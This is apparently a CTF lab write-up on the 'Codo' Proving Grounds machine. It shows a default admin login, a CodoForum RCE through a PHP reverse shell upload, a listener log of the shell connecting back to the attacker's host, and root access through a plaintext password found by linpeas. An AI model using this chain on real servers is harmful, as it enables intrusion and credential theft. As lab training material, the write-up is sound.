---
title: "Proving grounds Play: Codo"
layout: post
date: 2023-10-04 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- Codoforum
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/tcp open  http - Apache httpd 2.4.41 ((Ubuntu))

http://192.168.211.23/

![img](/assets/images/CTF/Proving_Grounds/Codo/web.png)

### Directory Fuzzing

![img](/assets/images/CTF/Proving_Grounds/Codo/web2.png)

Login to the admin dashboard using credentials `admin:admin`.

![img](/assets/images/CTF/Proving_Grounds/Codo/web3.png)

**Codoforum Current version: V.5.1.105**

The version is vulnerable to [CodoForum v5.1 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50978).

The exploit is not working properly so manual exploitation is necessarily required to obtain the initial foothold.

## Initial Foothold

**Code Explained**

```py
loginURL = options.target + '/admin/?page=login'
globalSettings = options.target + '/admin/index.php?page=config'
payloadURL = options.target + '/sites/default/assets/img/attachments/'
```

- As per the code the user has to login as admin.
- And navigate to `/admin/index.php?page=config`.
- Upload reverse shell.
- Trigger reverse shell at `/sites/default/assets/img/attachments/` + `uploaded_file_name`.

```py
    print("[*] Checking webshell status and executing...")
    payloadExec = session.get(payloadURL + randomFileName + '.php', proxies=proxy)
```

Upload pentest monkey PHP reverse shell.

![img](/assets/images/CTF/Proving_Grounds/Codo/rev_shell.png)

Trigger reverse shell at.

`http://192.168.211.23/sites/default/assets/img/attachments/shell.php`.

```sh
listening on [any] 4444 ...
connect to [192.168.45.225] from (UNKNOWN) [192.168.211.23] 55984
Linux codo 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 14:02:20 up 19 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@codo:/$ 
```

**Initial Foothold Obtained**

## Privilege Escalation

Download and run [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).

The script will find the password configured in the PHP config files in the system. 

```sh
╔══════════╣ Searching passwords in config PHP files
/var/www/html/sites/default/config.php:  'password' => 'FatPanda123',
```

Use the password to login to root.

```sh
www-data@codo:/tmp$ su root
su root
Password: FatPanda123

root@codo:/tmp# 
```

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).